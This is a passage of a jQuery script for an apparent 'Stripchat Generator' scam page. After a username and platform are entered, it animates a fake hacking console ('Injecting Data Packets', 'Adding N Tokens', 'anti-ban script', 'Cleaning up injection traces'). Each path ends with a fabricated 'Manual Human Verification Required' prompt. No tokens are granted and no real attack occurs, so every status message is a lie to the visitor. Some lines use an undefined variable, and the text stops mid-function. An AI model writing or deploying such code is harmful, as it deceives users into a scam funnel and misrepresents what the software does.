$(document).ready(function () {


    var $selected_platform = '';

    function fixplatformBox($platform_parent_class) {
        resetplatformBoxes();
        if ($platform_parent_class.hasClass('platform-1')) {
            $selected_platform = 'Android';
        }
        if ($platform_parent_class.hasClass('platform-2')) {
            $selected_platform = 'iOS';
        }
        $platform_parent_class.addClass('active');
    }

    function resetplatformBoxes() {
        var $platform_list = $('.platform-1, .platform-2');
        if ($platform_list.hasClass('active')) {
            $platform_list.removeClass('active');
        }
    }
    $('.platform-item-inner-wrapper').click(function () {
        fixplatformBox($(this));
    });

    //Button Click Sound Effect Init
    ion.sound({
        sounds: [
            {
                name: "button"
			}
		],
        volume: 0.9,
        path: "sound/",
        preload: true
    });

    //Tokens Progress Bar
    function progressBar(percent, $element) {
        var progressBarWidth = percent * $element.width() / 100;
        $element.find('div').animate({
            width: progressBarWidth
        }, 500).html(percent + "% ");
    }
    progressBar(20, $('#progressBar'));

    var select = $("#resource-item-1-amount-wrapper");
    var slider = $("<div id='slider-resource-1'></div>").insertAfter(select).slider({
        min: 1000,
        max: 5000,
        value: 1000,
        range: "min",
        change: function (event, ui) {
            var sliderValue = $("#slider-resource-1").slider("option", "value");
            $('#resource-1-amount').html(sliderValue);
            if (sliderValue == '1000') {
                progressBar(20, $('#progressBar'));
                $('#decrease-resource-1').addClass('btn-disabled');
            } else if (sliderValue == '2000') {
                progressBar(40, $('#progressBar'));
                $('#decrease-resource-1').removeClass('btn-disabled');
            } else if (sliderValue == '3000') {
                progressBar(60, $('#progressBar'));
            } else if (sliderValue == '4000') {
                progressBar(80, $('#progressBar'));
                $('#increase-resource-1').removeClass('btn-disabled');
            } else if (sliderValue == '5000') {
                progressBar(100, $('#progressBar'));
                $('#increase-resource-1').addClass('btn-disabled');
            }
        }
    });

    $('#verify-key').click(function () {
        $('#activation-key-message').fadeIn(500, function () {
            $('#activation-key-message').fadeOut();
        });
    });


    $('#increase-resource-1').click(function () {
        var sliderCurrentValue = $("#slider-resource-1").slider("option", "value");
        slider.slider("value", sliderCurrentValue + 1000);
        ion.sound.play("button");
    });
    $('#decrease-resource-1').click(function () {
        var sliderCurrentValue = $("#slider-resource-1").slider("option", "value");
        slider.slider("value", sliderCurrentValue - 1000);
        ion.sound.play("button");
    });

    //Resource 2 Progress Bar
    function progressBarResource2(percent, $element) {
        var progressBarResource2Width = percent * $element.width() / 100;
        $element.find('div').animate({
            width: progressBarResource2Width
        }, 500).html(percent + "% ");
    }
    progressBarResource2(20, $('#progressBarResource2'));
    var selectResource2 = $("#resource-item-2-amount-wrapper");
    var sliderResource2 = $("<div id='slider-resource-2'></div>").insertAfter(selectResource2).slider({
        min: 10000,
        max: 50000,
        value: 10000,
        range: "min",
        change: function (event, ui) {
            var sliderValueResource2 = $("#slider-resource-2").slider("option", "value");
            $('#resource-2-amount').html(sliderValueResource2);
            if (sliderValueResource2 == '10000') {
                progressBarResource2(20, $('#progressBarResource2'));
                $('#decrease-resource-2').addClass('btn-disabled');
            } else if (sliderValueResource2 == '20000') {
                progressBarResource2(40, $('#progressBarResource2'));
                $('#decrease-resource-2').removeClass('btn-disabled');
            } else if (sliderValueResource2 == '30000') {
                progressBarResource2(60, $('#progressBarResource2'));
            } else if (sliderValueResource2 == '40000') {
                progressBarResource2(80, $('#progressBarResource2'));
                $('#increase-resource-2').removeClass('btn-disabled');
            } else if (sliderValueResource2 == '50000') {
                progressBarResource2(100, $('#progressBarResource2'));
                $('#increase-resource-2').addClass('btn-disabled');
            }
        }
    });
    $('#increase-resource-2').click(function () {
        var sliderCurrentResource2Value = $("#slider-resource-2").slider("option", "value");
        sliderResource2.slider("value", sliderCurrentResource2Value + 10000);
        ion.sound.play("button");
    });
    $('#decrease-resource-2').click(function () {
        var sliderCurrentResource2Value = $("#slider-resource-2").slider("option", "value");
        sliderResource2.slider("value", sliderCurrentResource2Value - 10000);
        ion.sound.play("button");
    });

    function progressBarConsole(percent, $element) {
        var progressBarConsoleWidth = percent * $element.width() / 100;
        $element.find('div').animate({
            width: progressBarConsoleWidth
        }, 500).html(percent + "% ");
    }
    progressBarConsole(1, $('#progressBarConsole'));

    $('#connect-button').click(function () {
        ion.sound.play("button");
        if ($('#coc-player-tag').val().length > 2 && $selected_platform != '') {
            $.magnificPopup.open({
                items: {
                    src: '#message-wrapper',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                mainClass: 'mfp-fade'
            });
            $('.message-header h3').html("Connecting Account");
            $(".message-content p.console-message").fadeIn();
            var $console_message_username_msg = $('#coc-player-tag').val();
            var $console_message_platform_msg = $selected_platform;
            setTimeout(function () {
                $(".console-loadbar").fadeIn();
                $(".message-content p.console-message").typed({
                    strings: ["Connecting to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span> on <span class='console-message-connected-item'>" + $console_message_platform_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(20, $('#progressBarConsole'));
                    }
                });
            }, 500);
            setTimeout(function () {
                $(".message-content p.console-message").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
            }, 3500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Connected to Username <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(100, $('#progressBarConsole'));
                        setTimeout(function () {
                            $.magnificPopup.close();
                            $(".message-content p.console-message").hide();
                            progressBar(0, $('#progressBarConsole'));

                            progressBar(20, $('#progressBar'));
                            progressBarResource2(20, $('#progressBarResource2'));
                            $("#account-information-wrapper").animate({
                                right: -500,
                                opacity: "0"
                            }, 500);
                            $("#resources-select-wrapper").animate({
                                left: 0,
                                opacity: "show"
                            }, 1500);
                            $('html, body').animate({
                                scrollTop: $("#resources-select-wrapper").offset().top
                            }, 2000);
                        }, 1500);
                    }
                });
            }, 4800);
        } else {
            sweetAlert("Error", "Please enter your Username and select your Platform.", "error");
        }
    });

    $('#second-step-button').click(function () {
        ion.sound.play("button");
        if ($('input#myonoffswitch').is(':checked') && !$('input#myonoffswitch1').is(':checked')) {
            $(".message-content p.console-message").hide();
            $.magnificPopup.open({
                items: {
                    src: '#message-wrapper',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                mainClass: 'mfp-fade'
            });
            progressBar(0, $('#progressBarConsole'));
            $('.message-header h3').html("Stripchat Generator");
            $(".message-content p.console-message").fadeIn();
            var $console_message_username_msg = $('#coc-player-tag').val();
            var $console_message_platform_msg = $selected_platform;
            var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
            setTimeout(function () {
                $(".console-loadbar").fadeIn();
                $(".message-content p.console-message").typed({
                    strings: ["Processing..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(5, $('#progressBarConsole'));
                    }
                });
            }, 200);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing Files..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(15, $('#progressBarConsole'));
                    }
                });
            }, 1700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Encrypting Data..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(25, $('#progressBarConsole'));
                    }
                });
            }, 2700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Forming Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(32, $('#progressBarConsole'));
                    }
                });
            }, 3800);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing to inject Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(40, $('#progressBarConsole'));
                    }
                });
            }, 5500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Injecting Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(43, $('#progressBarConsole'));
                    }
                });
            }, 7800);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').fadeIn(500, function () {
                        var $console_resource1_countto = $('#slider-resource-1').slider("option", "value");
                        $('#console-resourceitem1-value').countTo({
                            from: 0,
                            to: $console_resource1_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(50, $('#progressBarConsole'));
                    }
                });
            }, 10500);
            setTimeout(function () {
                $(".console-resourceitem1-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(60, $('#progressBarConsole'));
                    }
                });
            }, 14000);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').hide();
                    $('.console-resourceitem2-wrapper').fadeIn(500, function () {
                        var $console_resource2_countto = $('#slider-resource-2').slider("option", "value");
                        $('#console-resourceitem2-value').countTo({
                            from: 0,
                            to: $console_resource2_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(65, $('#progressBarConsole'));
                    }
                });
            }, 16500);
            setTimeout(function () {
                $(".console-resourceitem2-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(70, $('#progressBarConsole'));
                    }
                });
            }, 20500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Searching for private proxy..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(75, $('#progressBarConsole'));
                    }
                });
            }, 22500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["proxy found and connected to your account..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(80, $('#progressBarConsole'));
                    }
                });
            }, 25000);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Cleaning up injection traces..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(85, $('#progressBarConsole'));
                    }
                });
            }, 27500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Performing Automatic Human Verification..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 29500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["<b class='highlighted'>Automatic Human Verification Failed</b>..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 32000);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Manual Human Verification Required..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 34500);
            setTimeout(function () {
                $(".message-content p.console-message").fadeOut(function () {
                    $(".human-verification-wrapper").fadeIn();
                });
            }, 37000);
        } else if ($('input#myonoffswitch1').is(':checked') && !$('input#myonoffswitch').is(':checked')) {
            $(".message-content p.console-message").hide();
            $.magnificPopup.open({
                items: {
                    src: '#message-wrapper',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                mainClass: 'mfp-fade'
            });
            progressBar(0, $('#progressBarConsole'));
            $('.message-header h3').html("Stripchat Generator");
            $(".message-content p.console-message").fadeIn();
            var $console_message_username_msg = $('#coc-player-tag').val();
            var $console_message_platform_msg = $selected_platform;
            var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
            setTimeout(function () {
                $(".console-loadbar").fadeIn();
                $(".message-content p.console-message").typed({
                    strings: ["Processing..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(5, $('#progressBarConsole'));
                    }
                });
            }, 200);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing Files..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(15, $('#progressBarConsole'));
                    }
                });
            }, 1700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Encrypting Data..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(25, $('#progressBarConsole'));
                    }
                });
            }, 2700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Forming Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(32, $('#progressBarConsole'));
                    }
                });
            }, 3800);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing to inject Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(40, $('#progressBarConsole'));
                    }
                });
            }, 5500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Injecting Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(43, $('#progressBarConsole'));
                    }
                });
            }, 7800);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').fadeIn(500, function () {
                        var $console_resource1_countto = $('#slider-resource-1').slider("option", "value");
                        $('#console-resourceitem1-value').countTo({
                            from: 0,
                            to: $console_resource1_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(50, $('#progressBarConsole'));
                    }
                });
            }, 10500);
            setTimeout(function () {
                $(".console-resourceitem1-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(65, $('#progressBarConsole'));
                    }
                });
            }, 14000);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').hide();
                    $('.console-resourceitem2-wrapper').fadeIn(500, function () {
                        var $console_resource2_countto = $('#slider-resource-2').slider("option", "value");
                        $('#console-resourceitem2-value').countTo({
                            from: 0,
                            to: $console_resource2_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(75, $('#progressBarConsole'));
                    }
                });
            }, 16500);
            setTimeout(function () {
                $(".console-resourceitem2-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(85, $('#progressBarConsole'));
                    }
                });
            }, 20500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Processing through anti-ban script ..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 22500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Processing successful..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 25000);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Cleaning up injection traces..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 27500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Performing Automatic Human Verification..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 29500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["<b class='highlighted'>Automatic Human Verification Failed</b>..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 32000);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Manual Human Verification Required..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 34500);
            setTimeout(function () {
                $(".message-content p.console-message").fadeOut(function () {
                    $(".human-verification-wrapper").fadeIn();
                });
            }, 37000);
        } else if ($('input#myonoffswitch').is(':checked') && $('input#myonoffswitch1').is(':checked')) {
            $(".message-content p.console-message").hide();
            $.magnificPopup.open({
                items: {
                    src: '#message-wrapper',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                mainClass: 'mfp-fade'
            });
            progressBar(0, $('#progressBarConsole'));
            $('.message-header h3').html("Stripchat Generator");
            $(".message-content p.console-message").fadeIn();
            var $console_message_username_msg = $('#coc-player-tag').val();
            var $console_message_platform_msg = $selected_platform;
            var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
            setTimeout(function () {
                $(".console-loadbar").fadeIn();
                $(".message-content p.console-message").typed({
                    strings: ["Processing..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(5, $('#progressBarConsole'));
                    }
                });
            }, 200);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing Files..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(15, $('#progressBarConsole'));
                    }
                });
            }, 1700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Encrypting Data..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(25, $('#progressBarConsole'));
                    }
                });
            }, 2700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Forming Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(32, $('#progressBarConsole'));
                    }
                });
            }, 3800);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing to inject Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(40, $('#progressBarConsole'));
                    }
                });
            }, 5500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Injecting Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(43, $('#progressBarConsole'));
                    }
                });
            }, 7800);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').fadeIn(500, function () {
                        var $console_resource1_countto = $('#slider-resource-1').slider("option", "value");
                        $('#console-resourceitem1-value').countTo({
                            from: 0,
                            to: $console_resource1_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(50, $('#progressBarConsole'));
                    }
                });
            }, 10500);
            setTimeout(function () {
                $(".console-resourceitem1-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(65, $('#progressBarConsole'));
                    }
                });
            }, 14000);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').hide();
                    $('.console-resourceitem2-wrapper').fadeIn(500, function () {
                        var $console_resource2_countto = $('#slider-resource-2').slider("option", "value");
                        $('#console-resourceitem2-value').countTo({
                            from: 0,
                            to: $console_resource2_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(70, $('#progressBarConsole'));
                    }
                });
            }, 16500);
            setTimeout(function () {
                $(".console-resourceitem2-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(73, $('#progressBarConsole'));
                    }
                });
            }, 20500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Searching for private proxy..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(78, $('#progressBarConsole'));
                    }
                });
            }, 22500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["proxy found and connected to your account..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(85, $('#progressBarConsole'));
                    }
                });
            }, 25000);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["processing through anti-ban script..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(87, $('#progressBarConsole'));
                    }
                });
            }, 27500);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["processing successful..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(90, $('#progressBarConsole'));
                    }
                });
            }, 30000);
            setTimeout(function () {
                $('.console-resourceitem2-wrapper').fadeOut();
                $(".message-content p.console-message").typed({
                    strings: ["Cleaning up injection traces..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(93, $('#progressBarConsole'));
                    }
                });
            }, 33300);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Performing Automatic Human Verification..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(95, $('#progressBarConsole'));
                    }
                });
            }, 36500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["<b class='highlighted'>Automatic Human Verification Failed</b>..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(95, $('#progressBarConsole'));
                    }
                });
            }, 38500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Manual Human Verification Required..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(95, $('#progressBarConsole'));
                    }
                });
            }, 40500);
            setTimeout(function () {
                $(".message-content p.console-message").fadeOut(function () {
                    $(".human-verification-wrapper").fadeIn();
                });
            }, 42500);
        } else {
            $(".message-content p.console-message").hide();
            $.magnificPopup.open({
                items: {
                    src: '#message-wrapper',
                },
                type: 'inline',
                preloader: false,
                modal: true,
                mainClass: 'mfp-fade'
            });
            progressBar(0, $('#progressBarConsole'));
            $('.message-header h3').html("Stripchat Generator");
            $(".message-content p.console-message").fadeIn();
            var $console_message_username_msg = $('#coc-player-tag').val();
            var $console_message_platform_msg = $selected_platform;
            var $console_message_resource1_msg = $('#slider-resource-1').slider("option", "value");
            setTimeout(function () {
                $(".console-loadbar").fadeIn();
                $(".message-content p.console-message").typed({
                    strings: ["Processing..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(5, $('#progressBarConsole'));
                    }
                });
            }, 200);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing Files..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(15, $('#progressBarConsole'));
                    }
                });
            }, 1700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Encrypting Data..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(25, $('#progressBarConsole'));
                    }
                });
            }, 2700);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Forming Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(32, $('#progressBarConsole'));
                    }
                });
            }, 3800);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Preparing to inject Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(40, $('#progressBarConsole'));
                    }
                });
            }, 5500);
            setTimeout(function () {
                $(".message-content p.console-message").typed({
                    strings: ["Injecting Data Packets..."],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(43, $('#progressBarConsole'));
                    }
                });
            }, 7800);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').fadeIn(500, function () {
                        var $console_resource1_countto = $('#slider-resource-1').slider("option", "value");
                        $('#console-resourceitem1-value').countTo({
                            from: 0,
                            to: $console_resource1_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(50, $('#progressBarConsole'));
                    }
                });
            }, 10500);
            setTimeout(function () {
                $(".console-resourceitem1-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
                    $(this).removeClass('bounce animated');
                });
                $(".message-content p.console-message").typed({
                    strings: ["<span class='console-message-connected-item'>" + $console_message_resource1_msg + "</span> Tokens Added Successfully"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(65, $('#progressBarConsole'));
                    }
                });
            }, 14000);
            setTimeout(function () {
                setTimeout(function () {
                    $('.console-resourceitem1-wrapper').hide();
                    $('.console-resourceitem2-wrapper').fadeIn(500, function () {
                        var $console_resource2_countto = $('#slider-resource-2').slider("option", "value");
                        $('#console-resourceitem2-value').countTo({
                            from: 0,
                            to: $console_resource2_countto,
                            speed: 1500,
                            refreshInterval: 10,
                            formatter: function (value, options) {
                                return value.toFixed(options.decimals);
                            }
                        });
                    });
                }, 500);
                $(".message-content p.console-message").typed({
                    strings: ["Adding <span class='console-message-connected-item'>" + $console_message_resource2_msg + "</span> Resource 2 to <span class='console-message-connected-item'>" + $console_message_username_msg + "</span>"],
                    showCursor: false,
                    typeSpeed: -50,
                    onStringTyped: function () {
                        progressBar(75, $('#progressBarConsole'));
                    }
                });
            }, 16500);
            setTimeout(function () {
                $(".console-resourceitem2-value-inner-wrapper").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () {
